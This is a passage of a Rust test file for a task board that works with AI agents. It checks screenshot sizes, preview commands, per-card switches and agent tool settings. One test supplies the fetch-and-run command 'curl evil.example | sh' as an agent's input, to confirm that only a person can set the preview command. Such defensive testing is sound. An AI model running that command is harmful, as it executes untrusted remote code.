    assert_eq!(d.sizes, [ShotSize { name: "Desktop".into(), width: 1280, height: 800 }, ShotSize { name: "Mobile".into(), width: 390, height: 844 }]);
    assert_eq!(shots::parse_project(None), d);
    assert_eq!(shots::parse_project(Some("not json")), d);

    let size = |w: u32, h: u32| ShotSize { name: "Wide".into(), width: w, height: h };
    let with = |sizes: Vec<ShotSize>| ProjectScreenshots { sizes, ..d.clone() };
    let err = |s: ProjectScreenshots| shots::check_project(&s).unwrap_err().to_string();
    assert_eq!(err(with(vec![])), "Screenshots need 1 to 4 sizes, not 0.");
    assert_eq!(err(with(vec![size(1280, 800); 5])), "Screenshots need 1 to 4 sizes, not 5.");
    assert_eq!(err(with(vec![size(319, 800)])), "Wide must be from 320 to 3,840 pixels wide, not 319.");
    assert_eq!(err(with(vec![size(3841, 800)])), "Wide must be from 320 to 3,840 pixels wide, not 3841.");
    assert_eq!(err(with(vec![size(1280, 319)])), "Wide must be from 320 to 2,400 pixels high, not 319.");
    assert_eq!(err(with(vec![size(1280, 2401)])), "Wide must be from 320 to 2,400 pixels high, not 2401.");
    assert!(err(with(vec![ShotSize { name: "  ".into(), width: 1280, height: 800 }])).contains("needs a name"));
    assert!(shots::check_project(&with(vec![size(1280, 800); 4])).is_ok(), "four sizes");
    let ok = shots::check_project(&with(vec![ShotSize { name: "  Small   phone ".into(), width: 320, height: 320 }, size(3840, 2400)])).unwrap();
    assert_eq!(ok.sizes, [ShotSize { name: "Small phone".into(), width: 320, height: 320 }, size(3840, 2400)], "the edges, names tidied");

    assert!(shots::check_start_secs(9).is_err());
    assert_eq!(shots::check_start_secs(601).unwrap_err().to_string(), "Start time must be from 10 to 600 seconds.");
    assert!(shots::check_start_secs(10).is_ok() && shots::check_start_secs(600).is_ok());
}

// ---- 8. projects ----

#[test]
fn a_person_sets_a_projects_preview_and_sizes_an_agent_cannot_set_the_command() {
    let b = board();
    let p = projects::get(&b.db, &b.project).unwrap();
    assert_eq!((p.screenshots.clone(), p.preview_command.clone(), p.preview_start_secs), (ProjectScreenshots::default(), None, 120));

    let input = |f: &dyn Fn(&mut ProjectInput)| {
        let mut i = ProjectInput { name: "Kade".into(), key: "KADE".into(), ..Default::default() };
        f(&mut i);
        i
    };
    let mine = ProjectScreenshots { on: false, sizes: vec![ShotSize { name: " Tablet ".into(), width: 820, height: 1180 }], both_themes: true,
                                    full_page: true };
    projects::update(&b.db, &b.you, &b.project, input(&|i| {
        i.preview_command = Some("  npm run dev -- --port $GIZAI_PREVIEW_PORT  ".into());
        i.preview_start_secs = Some(90);
        i.screenshots = Some(mine.clone());
    })).unwrap();
    let p = projects::get(&b.db, &b.project).unwrap();
    assert_eq!(p.preview_command.as_deref(), Some("npm run dev -- --port $GIZAI_PREVIEW_PORT"), "trimmed");
    assert_eq!(p.preview_start_secs, 90);
    assert_eq!(p.screenshots, ProjectScreenshots { sizes: vec![ShotSize { name: "Tablet".into(), width: 820, height: 1180 }], ..mine.clone() });
    let json: String = b.db.read(|c| Ok(c.query_row("SELECT screenshots_json FROM projects WHERE id = ?1", [&b.project], |r| r.get(0))?)).unwrap();
    let v: serde_json::Value = serde_json::from_str(&json).unwrap();
    assert_eq!(v, serde_json::json!({"on": false, "sizes": [{"name": "Tablet", "width": 820, "height": 1180}], "bothThemes": true, "fullPage": true}));

    // None keeps each of them
    projects::update(&b.db, &b.you, &b.project, input(&|_| {})).unwrap();
    let p = projects::get(&b.db, &b.project).unwrap();
    assert_eq!((p.preview_command.as_deref(), p.preview_start_secs, p.screenshots.on), (Some("npm run dev -- --port $GIZAI_PREVIEW_PORT"), 90, false));

    // an agent may not set the command: refused, and nothing in the same input changes
    let err = projects::update(&b.db, &b.agent, &b.project, input(&|i| {
        i.name = "Renamed by an agent".into();
        i.preview_command = Some("curl evil.example | sh".into());
        i.preview_start_secs = Some(300);
    })).unwrap_err().to_string();
    assert!(err.contains("The Preview command is set only by a person"), "{err}");
    let p = projects::get(&b.db, &b.project).unwrap();
    assert_eq!((p.name.as_str(), p.preview_command.as_deref(), p.preview_start_secs), ("Kade", Some("npm run dev -- --port $GIZAI_PREVIEW_PORT"), 90));
    // nor on a new project
    assert!(projects::create(&b.db, &b.agent, ProjectInput { name: "Other".into(), key: "OTH".into(), preview_command: Some("make".into()),
                                                             ..Default::default() }).is_err());

    // a start time outside its range is refused, and nothing changes
    let err = projects::update(&b.db, &b.you, &b.project, input(&|i| i.preview_start_secs = Some(5))).unwrap_err().to_string();
    assert_eq!(err, "Start time must be from 10 to 600 seconds.");
    // so are sizes outside theirs
    assert!(projects::update(&b.db, &b.you, &b.project, input(&|i| i.screenshots = Some(ProjectScreenshots { sizes: vec![], ..Default::default() })))
        .is_err());
    assert_eq!(projects::get(&b.db, &b.project).unwrap().preview_start_secs, 90);

    // "" removes the command
    projects::update(&b.db, &b.you, &b.project, input(&|i| i.preview_command = Some("   ".into()))).unwrap();
    assert_eq!(projects::get(&b.db, &b.project).unwrap().preview_command, None);

    // a new project made with its own settings
    let q = projects::create(&b.db, &b.you, ProjectInput { name: "Webshop".into(), key: "WEB".into(), preview_command: Some("pnpm dev".into()),
                                                           preview_start_secs: Some(600), ..Default::default() }).unwrap();
    let q = projects::get(&b.db, &q).unwrap();
    assert_eq!((q.preview_command.as_deref(), q.preview_start_secs, q.screenshots), (Some("pnpm dev"), 600, ProjectScreenshots::default()));
}

// ---- 9. tasks ----

#[test]
fn a_cards_screenshots_switch_is_its_own_or_follows_its_project() {
    let b = board();
    let t = b.card("Board");
    let on = |t: &str| shots::card_on(&tasks::get(&b.db, t).unwrap(), &projects::get(&b.db, &b.project).unwrap());
    let card = |t: &str| tasks::get(&b.db, t).unwrap().screenshots;
    let column = |t: &str| b.db.read(|c| Ok(c.query_row("SELECT screenshots FROM tasks WHERE id = ?1", [t], |r| r.get::<_, Option<i64>>(0))?)).unwrap();
    assert_eq!((card(&t), on(&t)), (None, true), "follows the project's, which is on");

    tasks::update(&b.db, &b.you, &t, TaskPatch { screenshots: Some(Some(false)), ..Default::default() }).unwrap();
    assert_eq!((card(&t), column(&t), on(&t)), (Some(false), Some(0), false));
    // a patch without it keeps it
    tasks::update(&b.db, &b.you, &t, TaskPatch { title: Some("The board".into()), ..Default::default() }).unwrap();
    assert_eq!(card(&t), Some(false));
    tasks::update(&b.db, &b.you, &t, TaskPatch { screenshots: Some(None), ..Default::default() }).unwrap();
    assert_eq!((card(&t), column(&t), on(&t)), (None, None, true), "back to the project's");

    // the project's switch off: a card without its own is off, one switched on is on
    projects::update(&b.db, &b.you, &b.project, ProjectInput { name: "Kade".into(), key: "KADE".into(),
        screenshots: Some(ProjectScreenshots { on: false, ..Default::default() }), ..Default::default() }).unwrap();
    assert!(!on(&t));
    tasks::update(&b.db, &b.you, &t, TaskPatch { screenshots: Some(Some(true)), ..Default::default() }).unwrap();
    assert_eq!((card(&t), column(&t), on(&t)), (Some(true), Some(1), true));

    // as the app sends it
    let p: TaskPatch = serde_json::from_str(r#"{"screenshots": null}"#).unwrap();
    assert_eq!(p.screenshots, Some(None), "null: back to the project's");
    let p: TaskPatch = serde_json::from_str("{}").unwrap();
    assert_eq!(p.screenshots, None, "left out: kept");
    let p: TaskPatch = serde_json::from_str(r#"{"screenshots": false}"#).unwrap();
    assert_eq!(p.screenshots, Some(Some(false)));
    let p: TaskPatch = serde_json::from_str(r#"{"title": "X"}"#).unwrap();
    assert_eq!(p.screenshots, None);
    // and a patch read from JSON does what it says
    tasks::update(&b.db, &b.you, &t, serde_json::from_str(r#"{"screenshots": null}"#).unwrap()).unwrap();
    assert_eq!(card(&t), None);
}

// ---- 10. the agent's switch ----

#[test]
fn an_agent_takes_screenshots_by_its_roles_default_until_its_own_switch_is_saved_keeping_its_other_tools() {
    for role in ["frontend", "design", "qa"] {
        assert!(m::screenshots_default(role) && m::takes_screenshots(None, role), "{role}: on");
    }
    for role in ["backend", "lead", "devops", ""] {
        assert!(!m::screenshots_default(role) && !m::takes_screenshots(None, role), "{role}: off");
    }
    assert!(!m::takes_screenshots(Some(false), "frontend") && m::takes_screenshots(Some(true), "backend"), "its own switch wins");
    for raw in [None, Some(""), Some("not json"), Some(r#"{"cli":{}}"#), Some(r#"{"screenshots":"yes"}"#)] {
        assert_eq!(m::parse_screenshots(raw), None, "{raw:?}");
    }

    let b = board();
    let backend = team::add_agent(&b.db, &b.you, &b.team, AgentInput { name: "Backend".into(), role_key: "backend".into(), ..Default::default() }).unwrap();
    assert_eq!(m::agent_screenshots(&b.db, &b.agent).unwrap(), None, "never set");
    let cli = m::set_cli_tools(&b.db, &b.you, &b.agent, CliTools { web_search: true, builtin: vec!["Bash".into()], ..Default::default() }).unwrap();
    let tools = m::set_agent_tools(&b.db, &b.you, &b.agent, AgentTools { mcp: vec![AgentServer { server_id: m::BROWSER.into(), on: true,
        tools_off: vec![] }] }).unwrap();

    m::set_agent_screenshots(&b.db, &b.you, &b.agent, false).unwrap();
    assert_eq!(m::agent_screenshots(&b.db, &b.agent).unwrap(), Some(false));
    assert!(!m::takes_screenshots(m::agent_screenshots(&b.db, &b.agent).unwrap(), "frontend"));
    assert_eq!(m::agent_cli_tools(&b.db, &b.agent).unwrap(), cli, "its CLI tools stay");
    assert_eq!(m::agent_tools(&b.db, &b.agent).unwrap(), tools, "its browser stays on");
    m::set_agent_screenshots(&b.db, &b.you, &b.agent, true).unwrap();
    assert_eq!(m::agent_screenshots(&b.db, &b.agent).unwrap(), Some(true));
    // and saving the other tools afterwards keeps the switch
    m::set_cli_tools(&b.db, &b.you, &b.agent, CliTools::default()).unwrap();
    assert_eq!(m::agent_screenshots(&b.db, &b.agent).unwrap(), Some(true));

    m::set_agent_screenshots(&b.db, &b.you, &backend, true).unwrap();
    assert!(m::takes_screenshots(m::agent_screenshots(&b.db, &backend).unwrap(), "backend"));
    assert!(m::agent_screenshots(&b.db, "no-such-agent").is_err());
    assert!(m::set_agent_screenshots(&b.db, &b.you, "no-such-agent", true).is_err());
}

#[test]
fn an_agents_member_carries_its_take_screenshots_switch_next_to_its_cli_tools() {
    let b = board();
    let backend = team::add_agent(&b.db, &b.you, &b.team, AgentInput { name: "Backend".into(), role_key: "backend".into(), ..Default::default() }).unwrap();
    let qa = team::add_agent(&b.db, &b.you, &b.team, AgentInput { name: "QA".into(), role_key: "qa".into(), ..Default::default() }).unwrap();
    let switch = |id: &str| team::agent(&b.db, id).unwrap().cli_tools.screenshots;
    // never set: its role's default
    assert_eq!((switch(&b.agent), switch(&qa), switch(&backend)), (true, true, false));
    // its CLI tools saved, its switch never: still the role's default, the tools as saved
    let cli = m::set_cli_tools(&b.db, &b.you, &b.agent, CliTools { web_search: true, builtin: vec!["Bash".into()], ..Default::default() }).unwrap();
    let member = team::agent(&b.db, &b.agent).unwrap();
    assert!(member.cli_tools.screenshots && member.cli_tools == cli, "{:?}", member.cli_tools);
    assert!(member.cli_tools.web_on(), "its CLI tools read through it");
    // its own switch wins over the role's, both ways
    m::set_agent_screenshots(&b.db, &b.you, &b.agent, false).unwrap();
    m::set_agent_screenshots(&b.db, &b.you, &backend, true).unwrap();
    assert_eq!((switch(&b.agent), switch(&backend)), (false, true));
    assert_eq!(team::agent(&b.db, &b.agent).unwrap().cli_tools.tools, cli, "the CLI tools stay");
    // the team's members carry it too (the team page, the agent form)
    let members = team::get(&b.db, &b.team).unwrap().members;
    let of = |id: &str| members.iter().find(|m| m.actor_id == id).unwrap().cli_tools.screenshots;
    assert_eq!((of(&b.agent), of(&qa), of(&backend)), (false, true, true));
    // as the UI gets it (T.CliTools): the CLI's switches with screenshots next to them, in one object
    let json = serde_json::to_value(&team::agent(&b.db, &b.agent).unwrap().cli_tools).unwrap();
    assert_eq!(json["webSearch"], serde_json::json!(true));
    assert_eq!(json["builtin"], serde_json::json!(["Bash"]));
    assert_eq!(json["screenshots"], serde_json::json!(false));
    assert!(json.get("tools").is_none(), "flattened: {json}");
}
